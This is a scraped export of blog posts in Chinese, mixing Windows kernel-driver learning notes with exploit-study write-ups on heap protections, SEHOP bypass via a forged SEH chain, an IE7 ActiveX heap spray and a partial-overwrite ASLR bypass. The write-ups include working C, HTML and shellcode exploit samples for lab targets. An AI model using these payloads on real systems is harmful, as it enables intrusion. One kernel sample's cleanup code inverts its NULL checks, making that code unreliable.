pFirstMemory = ExAllocateFromNPagedLookasideList(pLookAsideList); if (pFirstMemory == NULL) { break; } pSeocdeMemory = ExAllocateFromNPagedLookasideList(pLookAsideList); if (pSeocdeMemory == NULL) { break; } DbgPrint(\u0026#34;[%ws] First Address:%p, Second Address:%p\\n\u0026#34;, __FUNCTIONW__, pFirstMemory, pSeocdeMemory); // free first ExFreeToNPagedLookasideList(pLookAsideList, pFirstMemory); pFirstMemory = NULL; // reallocate pFirstMemory = ExAllocateFromNPagedLookasideList(pLookAsideList); if (pFirstMemory == NULL) { break; } DbgPrint(\u0026#34;[%ws] Re-Allocate First Address:%p\\n\u0026#34;, __FUNCTIONW__, pFirstMemory); bSucc = TRUE; } while (FALSE); if (pFirstMemory != NULL) { ExFreeToNPagedLookasideList(pLookAsideList, pFirstMemory); pFirstMemory = NULL; } if (pSeocdeMemory != NULL) { ExFreeToNPagedLookasideList(pLookAsideList, pSeocdeMemory); pSeocdeMemory = NULL; } if (bInit == TRUE) { ExDeleteNPagedLookasideList(pLookAsideList); bInit = FALSE; } if (pLookAsideList != NULL) { ExFreePoolWithTag(pLookAsideList, \u0026#39;test\u0026#39;); pLookAsideList = NULL; } } 对象与句柄 在内核中创建，在内核中销毁，由内核管理与维护的对象称为内核对象\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 void TestFuncObject() { BOOLEAN bSucc = FALSE; HANDLE hCreateEvent = NULL; PVOID pCreateEventObject = NULL; HANDLE hOpenEvent = NULL; PVOID pOpenEventObject = NULL; do { OBJECT_ATTRIBUTES ObjAttr = { 0 }; UNICODE_STRING uNameString = { 0 }; RtlInitUnicodeString(\u0026amp;uNameString, L\u0026#34;\\\\BaseNamedObjects\\\\TestEvent\u0026#34;); InitializeObjectAttributes(\u0026amp;ObjAttr, \u0026amp;uNameString, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL); ZwCreateEvent(\u0026amp;hCreateEvent, EVENT_ALL_ACCESS, \u0026amp;ObjAttr, SynchronizationEvent, FALSE); if (hCreateEvent == NULL) { break; } // get point ObReferenceObjectByHandle(hCreateEvent, EVENT_ALL_ACCESS, *ExEventObjectType, KernelMode, \u0026amp;pCreateEventObject, NULL); if (pCreateEventObject == NULL) { break; } // open obj with attribute:name ZwOpenEvent(\u0026amp;hOpenEvent, EVENT_ALL_ACCESS, \u0026amp;ObjAttr); if (hOpenEvent == NULL) { break; } ObReferenceObjectByHandle(hOpenEvent, EVENT_ALL_ACCESS, *ExEventObjectType, KernelMode, \u0026amp;pOpenEventObject, NULL); if (pOpenEventObject == NULL) { break; } DbgPrint(\u0026#34;[%ws] Create Handle:%p, Create Object Address:%p\\n\u0026#34;, __FUNCTIONW__, hCreateEvent, pCreateEventObject); DbgPrint(\u0026#34;[%ws] Open Handle:%p, Open Object Address:%p\\n\u0026#34;, __FUNCTIONW__, hOpenEvent, pOpenEventObject); bSucc = TRUE; } while (FALSE); if (pCreateEventObject == NULL) { ObDereferenceObject(pCreateEventObject); pCreateEventObject = NULL; } if (hCreateEvent == NULL) { ZwClose(hCreateEvent); hCreateEvent = NULL; } if (pOpenEventObject == NULL) { ObDereferenceObject(pOpenEventObject); pOpenEventObject = NULL; } if (hOpenEvent == NULL) { ZwClose(hOpenEvent); hOpenEvent = NULL; } } 一个小小的坑：在导入头文件的时候发生冲突：ntddk.h和ntifs.h，解决办法是将ntifs.h放到ntddk.h的前面导入，这样就没有冲突了\n注册表 注册表其实是Windows的配置存储结构，存储着系统绝大部分的配置信息，其中大多数文件存储在系统盘下SYSTEM32\\CONFIG目录下，这些文件以内存映射方式存储在内核空间中，然后以“HIVE”的方式组织起来，注册表API实际上操作的是HIVE内存数据，最终会写回到config目录下对应的文件中去\n打开与关闭 未完待续 ","date":"2020-12-18T20:52:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/windows%E5%86%85%E6%A0%B8%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-002-%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84/","title":"Windows内核编程学习笔记-002-基本结构"},{"content":"本文来源：Moeomu的博客\nWindows内核开发环境配置 下载 开发机\nWindows 10 20H2 x64 Visual Studio 2019 Windows Driver Kit - Windows 10.0.19041.685(Windows 10 2004) WinDbg Preview 测试机\nWindows 10 2004 x64 DbgView 测试驱动程序 还是使用最经典的HelloWorld来作为开始吧\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;ntddk.h\u0026gt; VOID DriverUnload(PDRIVER_OBJECT DriverObject) { DbgPrint(\u0026#34;[%ws] Driver Unload, Driver Object Address: %p\\n\u0026#34;, __FUNCTIONW__, DriverObject); } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { DbgPrint(\u0026#34;[%ws] Hello Kernel World!\\n\u0026#34;, __FUNCTIONW__); if (DriverObject != NULL) { DbgPrint(\u0026#34;[%ws] Driver Object Address: %p\\n\u0026#34;, __FUNCTIONW__, DriverObject); DriverObject-\u0026gt;DriverUnload = DriverUnload; } if (RegistryPath != NULL) { DbgPrint(\u0026#34;[%ws] Driver Registry Path: %wZ\\n\u0026#34;, __FUNCTIONW__, RegistryPath); } return STATUS_SUCCESS; } 测试调试 参考Windows内核调试一文来布置调试环境，只不过将Windows7的地方改成Windows10即可\n上下文环境解析 上下文指的是CPU在执行代码时，改代码所处的环境与状态。\n实验：PsGetCurrentProcessId 实验目的是为了找出所写出的驱动模块究竟在哪个“进程”中执行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;ntddk.h\u0026gt; VOID DriverUnload(PDRIVER_OBJECT DriverObject) { DbgPrint(\u0026#34;[%ws] Driver Unload, Driver Object Address: %p, Current Process Id=0x%p\\n\u0026#34;, __FUNCTIONW__, DriverObject, PsGetCurrentProcessId()); } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { DbgPrint(\u0026#34;[%ws] Hello Kernel World, Current Process Id=0x%p\\n\u0026#34;, __FUNCTIONW__, PsGetCurrentProcessId()); if (DriverObject != NULL) { DbgPrint(\u0026#34;[%ws] Driver Object Address: %p\\n\u0026#34;, __FUNCTIONW__, DriverObject); DriverObject-\u0026gt;DriverUnload = DriverUnload; } if (RegistryPath != NULL) { DbgPrint(\u0026#34;[%ws] Driver Registry Path: %wZ\\n\u0026#34;, __FUNCTIONW__, RegistryPath); } return STATUS_SUCCESS; } 如图 结论 无论是驱动入口函数还是驱动卸载回调函数都隶属于ID为4的进程，此进程为System进程\nSystem进程是操作系统虚拟出来的一个进程，代表系统内核 驱动和应用层上下文应当严格区分，若进程A运行在P1虚拟空间内，而驱动当前的CPU上下文是P2的虚拟空间，那么访问到的内容应当是不可预料的 中断请求级别 与线程的优先级的概念类似，系统调度器以时间片为粒度调度，根据线程的优先级来调度线程，线程优先级越高，获得调度的机会越大。而在驱动层，CPU提供了IRQL的概念，规定高IRQL级别的代码可以中断、抢占低IRQL的代码的执行过程，从而执行。\n常见的IRQL中断请求级别表 IRQL 数值(x86, amd64, IA64) 描述 PASSIVE_LEVEL 0, 0, 0 应用层线程以及大部分内核函数处于该IRQL，可与无限制使用所有内核API，可以访问分页以及非分页内存 APC_LEVEL 1, 1, 1 异步方法调用(APC)，或者页错误时处于该IRQL，可以使用大部分内核API，可以访问分页以及非分页内存 DISPATCH_LEVEL 2, 2, 2 延迟方法调用(DPC)时处于该IRQL，可以使用特定的内核API，只能访问非分页内存 判断当前IRQL 在驱动程序入口点DriverEntry，IRQL为PASSIVE_LEVEL，这是系统保证的 通过调用KeGetCurrentIrql函数来获取当前的IRQL 如图所示，IRQL都是0，对照上表，级别是PASSIVE_LEVEL 结论 在调用某个函数之前首先看清楚函数说明文档，仔细观察安全调用函数的IRQL级别是什么，以此来实现安全编程 驱动异常 开发驱动时，若驱动程序代码编写不合规引发系统崩溃的情况，表现为蓝屏(BSOD)。\n常见原因 高IRQL死锁 内存访问违规 函数堆栈不平衡 主动引发蓝屏 可以使用KeBugCheckEx函数主动引发蓝屏 结论 在代码发生不可预知错误时，主动引发蓝屏可以减少进一步扩大错误 ","date":"2020-12-18T18:52:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/windows%E5%86%85%E6%A0%B8%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-001-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","title":"Windows内核编程学习笔记-001-环境搭建"},{"content":"本文来源：Moeomu的博客\n前奏 在macOS Big Sur下可以使用 之前是使用命令启动的不完美解决办法，还会导致一系列权限问题，现在终于完美了 解决方案 最高权限编辑文件/Library/Preferences/Parallels/network.desktop.xml 将UseKextless字段的值从-1改为0 注意：这个值可能并不是所有人-1，也可能并不是所有人改为0都行，勇于尝试嘛\n","date":"2020-12-16T13:42:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/parallelsdesktop16-%E4%BF%AE%E5%A4%8D%E7%BD%91%E7%BB%9C/","title":"ParallelsDesktop16 修复网络"},{"content":"本文来源：Moeomu的博客\n简介 PEB Random：微软在Windows XP SP2之后不再使用固定的PEB基址0x7ffdf000，而是使用具有一定随机性的PEB基址。PEB随机化之后主要影响了对PEB中函数的攻击，在DWORD SHOOT的时候，PEB中的函数指针是绝佳的目标，移动PEB基址将在一定程度上给这类攻击增加难度。覆盖PEB中函数指针的利用方式请参见堆溢出利用中的实验和攻击PEB中的函数指针的相关介绍 SafeUnlink：微软改写了操作双向链表的代码，在卸载free list中的堆块时更加小心。对照堆溢出利用-DWORD SHOOT中关于双向链表拆卸问题的描述，在SP2之前的链表拆卸操作类似于如下代码： 1 2 3 4 5 6 int remove(ListNode * node) { node -\u0026gt; blink -\u0026gt; flink = node -\u0026gt; flink; node -\u0026gt; flink -\u0026gt; blink = node -\u0026gt; blink; return 0; } SP2 在进行删除操作时，将提前验证堆块前向指针和后向指针的完整性，以防止发生DWORD SHOOT： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 int safe_remove(ListNode * node) { if((node-\u0026gt;blink-\u0026gt;flink == node) \u0026amp;\u0026amp; (node-\u0026gt;flink-\u0026gt;blink == node)) { node -\u0026gt; blink -\u0026gt; flink = node -\u0026gt; flink; node -\u0026gt; flink -\u0026gt; blink = node -\u0026gt; blink; return 1; } else { // 链表指针被破坏，进入异常 return 0; } } heap cookie：栈中的security cookie类似，微软在堆中也引入了cookie，用于检测堆溢出的发生。cookie被布置在堆首部分原堆块的segment table的位置，占1个字节大小 元数据加密：微软在Windows Vista及后续版本的操作系统中开始使用该安全措施。块首中的一些重要数据在保存时会与一个4字节的随机数进行异或运算，在使用这些数据时候需要再进行一次异或运行来还原，这样我们就不能直接破坏这些数据了，以达到保护堆的目的。 攻击思路 攻击堆内存储的变量 这样的方法是攻击堆内存储的函数指针之类的方法实现溢出，但是和堆本身并没有什么关系\n利用chunk重设大小攻击堆 原理 SafeUnlink在堆从freelist中卸下堆块的时候进行双链表有效性校验，但是将堆块插入freelist中的操作却没有校验\n时机 内存中释放堆块后，将会被插入空表 堆块的空间大于申请的空间，剩余的空间将被插入空表 新chunk的插入过程 Flink：下一个节点；Blink：上一个节点；参见MSDN-NTDEF-LIST\n新chunk-\u0026gt;Blink=旧chunk-\u0026gt;Flink-\u0026gt;Blink 旧chunk-\u0026gt;Flink-\u0026gt;Blink-\u0026gt;Flink=新chunk 旧chunk-\u0026gt;Flink-\u0026gt;Blink=新chunk 只要将旧chunk的Flink指针覆盖为地址，将Blink覆盖为值，就又可以进行DWORDSHOOT了\n代码 未完待续 ","date":"2020-11-28T16:15:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-021-%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/","title":"漏洞利用学习笔记-021-保护下的堆"},{"content":"本文来源：Moeomu的博客\n简介 SEHOP的核心任务就是检查S.E.H链的完整性，在程序转入异常处理前SEHOP会检查S.E.H链上最后一个异常处理函数是否为系统固定的终极异常处理函数。如果是，则说明这条S.E.H链没有被破坏，程序可以去执行当前的异常处理函数；如果检测到最后一个异常处理函数不是，则说明S.E.H链被破坏，可能发生了S.E.H覆盖攻击，程序将不会去执行当前的异常处理函数\nSEHOP验证伪代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 if (process_flags \u0026amp; 0x40 == 0) // 如果没有SEH记录则不进行检测 { if (record != 0xFFFFFFFF) // 开始检测 { do { if (record \u0026lt; stack_bottom || record \u0026gt; stack_top) // SEH 记录必须位于栈中 goto corruption; if ((char *)record + sizeof(EXCEPTION_REGISTRATION) \u0026gt; stack_top) // SEH 记录结构需完全在栈中 goto corruption; if ((record \u0026amp; 3) != 0) // SEH记录必须4字节对齐 goto corruption; handler = record-\u0026gt;handler; if (handler \u0026gt;= stack_bottom \u0026amp;\u0026amp; handler \u0026lt; stack_top) // 异常处理函数地址不能位于栈中 goto corruption; record = record-\u0026gt;next; } while (record != 0xFFFFFFFF); // 遍历S.E.H链 } if ((TEB-\u0026gt;word_at_offset_0xFCA \u0026amp; 0x200) != 0) { if (handler != \u0026amp;FinalExceptionHandler) // 核心检测，地球人都知道，不解释了 goto corruption; } } 攻击思路 攻击返回地址 如果此函数启用了SEHOP但是没有启用GS或者函数刚好没有启用GS那么直接攻击返回地址即可\n攻击虚函数 SEHOP只保护SEH，但是虚函数表它并没有保护，攻击虚函数依旧可以成功\n利用未启用SEHOP的模块 微软为一些加密壳禁用了SEHOP，例如穿山甲Armadilo\n操作系统会根据PE头中MajorLinkerVersion和MinorLinkerVersion两个选项来判断是否为程序禁用SEHOP。例如，我们可以将这两个选项分别设置为0x53和0x52来模拟经过Armadilo加壳的程序，从而达到禁用SEHOP的目的 Windows 7以及以后的系统中PEB_LDR_DATA指向的第二个模块被KernelBase.dll占据，所以shellcode应该修改一下 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Shellcode_for_windows7= \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\u0026#34; \u0026#34;\\x8B\\x09\u0026#34; // 在这增加机器码\\x8B\\x09，它对应的汇编为mov ecx,[ecx] \u0026#34;\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\u0026#34; ; 伪造SEH链表 前提：ASLR不启用\n思路\n通过未启用SafeSEH的SEH_NOSafeSEH_JUMP.dll来绕过SafeSEH 通过伪造S.E.H链，造成S.E.H链未被破坏的假象来绕过SEHOP SEH_NOSafeSEH中的test函数存在一个典型的溢出，即通过向str复制超长字符串造成str溢出，进而覆盖程序的S.E.H信息 使用SEH_NOSafeSEH_JUMP.DLL中的pop pop retn指令地址覆盖异常处理函数地址，然后通过制造除0异常，将程序转入异常处理 通过劫持异常处理流程，程序转入SEH_NOSaeSEH_JUMP.DLL中执行pop pop retn指令，在执行retn后程序转入shellcode执行 代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; char shellcode[] = \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x14\\xFF\\x12\\x00\u0026#34; // address of last seh record \u0026#34;\\x12\\x10\\x12\\x11\u0026#34; // address of pop pop retn in No_SafeSEH module \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\u0026#34; \u0026#34;\\x8B\\x09\u0026#34; // 在这增加机器码\\x8B\\x09，它对应的汇编为mov ecx,[ecx] \u0026#34;\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\u0026#34; \u0026#34;\\xFF\\xFF\\xFF\\xFF\u0026#34; // the fake seh record \u0026#34;\\x75\\xA8\\xF7\\x77\u0026#34; ; DWORD MyException(void) { printf(\u0026#34;There is an exception\u0026#34;); getchar(); return 1; } void test(char * input) { char str[200]; memcpy(str, input, 412); int zero = 0; __try { zero = 1 / zero; } __except(MyException()){} } int main() { HINSTANCE hInst = LoadLibrary(_T(\u0026#34;SEH_NOSaeSEH_JUMP.dll\u0026#34;)); // load No_SafeSEH module char str[200]; test(shellcode); return 0; } ","date":"2020-11-28T15:38:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-020-sehop%E7%AE%80%E4%BB%8B/","title":"漏洞利用学习笔记-020-SEHOP简介"},{"content":"本文来源：Moeomu的博客\n原理 通过申请大量的内存，占领内存中的0x0C0C0C0C的位置，并在这些内存中放置0x90和shellcode，最后控制程序转入0x0C0C0C0C执行。只要运气不要差到0x0C0C0C0C刚好位于shellcode中的某个位置，shellcode就可以成功执行\n实验 准备工作 环境：系统：Windows Vista SP0，DEP状态：默认，浏览器：IE7\n还是将之前用过的Vulner_AX.dll作为攻击目标 VulnerAX.idl中CVulnerAXCtrl的类信息的UUID：ACA3927C-6BD1-4B4E-8697-72481279AAEC 思想 我们利用Heap spray技术在内存中申请200个1MB的内存块来对抗ASLR的随机化处理 每个内存块中包含着0x90填充和shellcode Heap spray结束后我们会占领0x0C0C0C0C附近的内存，我们只要控制程序转入0x0C0C0C0C执行，在经过若干个0x90滑行之后就可以到达shellcode范围并执行 test函数中存在一个典型的溢出漏洞，通过复制超长字符串可以覆盖函数返回地址 我们将函数返回地址覆盖为0x0C0C0C0C，在函数执行返回执行后就会转入我们申请的内存空间中 代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; var nops = unescape(\u0026#34;%u9090%u9090\u0026#34;); var shellcode = \u0026#34;\\u68fc\\u0a6a\\u1e38\\u6368\\ud189\\u684f\\u7432\\u0c91\\uf48b\\u7e8d\\u33f4\\ub7db\\u2b04\\u66e3\\u33bb\\u5332\\u7568\\u6573\\u5472\\ud233\\u8b64\\u305a\\u4b8b\\u8b0c\\u1c49\\u098b\\u698b\\uad08\\u6a3d\\u380a\\u751e\\u9505\\u57ff\\u95f8\\u8b60\\u3c45\\u4c8b\\u7805\\ucd03\\u598b\\u0320\\u33dd\\u47ff\\u348b\\u03bb\\u99f5\\ube0f\\u3a06\\u74c4\\uc108\\u07ca\\ud003\\ueb46\\u3bf1\\u2454\\u751c\\u8be4\\u2459\\udd03\\u8b66\\u7b3c\\u598b\\u031c\\u03dd\\ubb2c\\u5f95\\u57ab\\u3d61\\u0a6a\\u1e38\\ua975\\udb33\\u6853\\u616B\\u6F6F\\u4D68\\u7369\\u8B61\\u53c4\\u5050\\uff53\\ufc57\\uff53\\uf857\u0026#34;; while (nops.length \u0026lt; 0x100000) nops += nops; nops = nops.substring(0, 0x100000/2-32/2-4/2-2/2-shellcode.length); nops = nops + shellcode; var memory = new Array(); for (var i = 0; i \u0026lt; 200; i++) memory[i] += nops; \u0026lt;/script\u0026gt; \u0026lt;object classid=\u0026#34;clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC\u0026#34; id=\u0026#34;test\u0026#34;\u0026gt; \u0026lt;/object\u0026gt; \u0026lt;script\u0026gt; var s = \u0026#34;\\u9090\u0026#34;; while (s.length \u0026lt; 54) { s += \u0026#34;\\u9090\u0026#34;; } s += \u0026#34;\\u0C0C\\u0C0C\u0026#34;; test.test(s); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 结果 成功攻击ASLR，如图 ","date":"2020-11-28T12:38:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-019-%E5%88%A9%E7%94%A8heapspray%E6%94%BB%E5%87%BBaslr/","title":"漏洞利用学习笔记-019-利用HeapSpray攻击ASLR"},{"content":"本文来源：Moeomu的博客\n原理 映像随机化指示对映像加载基址的全两个字节随机化处理，这样做的后果是跳板始终可用，因此可以利用这一点去绕过ASLR 如果攻击memcpy的话，可以将返回值控制在0xXXXX0000~0xXXXXFFFF之间，而攻击str类函数攻击，可以将控制地址为0xXXXX0100~0xXXXX00FF之间的一个 过程 首先在编译完的程序内找到一条jmp eax的汇编码，随后将它的地址的低word作为off by word的地址，填入shellcode 计算好缓冲区大小，溢出后即可正常 代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include \u0026lt;memory.h\u0026gt; char shellcode[] = \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; // payload \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x2A\\x23\u0026#34; // off by word ; char* test() { char tt[256]; memcpy(tt, shellcode, 262); return tt; } int main() { char temp[200]; test(); return 0; } 开始实验 实验环境：系统：Windows Vista SP0，系统DEP状态：Optin默认，编译器：Visual Studio 